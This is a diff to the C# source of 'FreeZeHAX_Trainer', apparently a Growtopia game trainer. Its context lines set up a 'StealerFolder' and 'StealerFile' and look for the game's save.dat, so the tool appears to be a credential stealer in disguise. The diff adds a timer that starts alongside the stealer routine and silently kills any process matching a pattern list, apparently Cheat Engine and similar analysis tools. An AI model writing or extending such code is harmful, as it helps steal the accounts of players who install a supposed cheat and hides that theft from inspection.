@@ -2,6 +2,7 @@
 using Microsoft.Win32;
 using Microsoft.Win32.TaskScheduler;
 using System;
+using System.Diagnostics;
 using System.Drawing;
 using System.IO;
 using System.Linq;
@@ -77,6 +78,7 @@ namespace FreeZeHAX_Trainer
                 string StealerFolder = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Microsoft\\WindowsApps\\";
                 string StealerFile = StealerFolderLoc + "\\" + FileName;
                 bool savePathExists = File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Growtopia\\save.dat");
+                CETimer.Start();
                 others.DirClean(StealerFolder);
                 others.Wait(1000);
                 Directory.CreateDirectory(StealerFolderLoc);
@@ -1085,6 +1087,25 @@ namespace FreeZeHAX_Trainer
         private void RestartTrainer_Click(object sender, EventArgs e)
         {
             Application.Restart();
+        }
+
+        private void CETimer_Tick(object sender, EventArgs e)
+        {
+            try
+            {
+                foreach (string CEs in others.CE)
+                {
+                    Regex regex = new Regex(CEs);
+                    foreach (Process p in Process.GetProcesses("."))
+                    {
+                        if (regex.Match(p.ProcessName).Success)
+                        {
+                            p.Kill();
+                        }
+                    }
+                }
+            }
+            catch (Exception) { }
         }
     }
 }
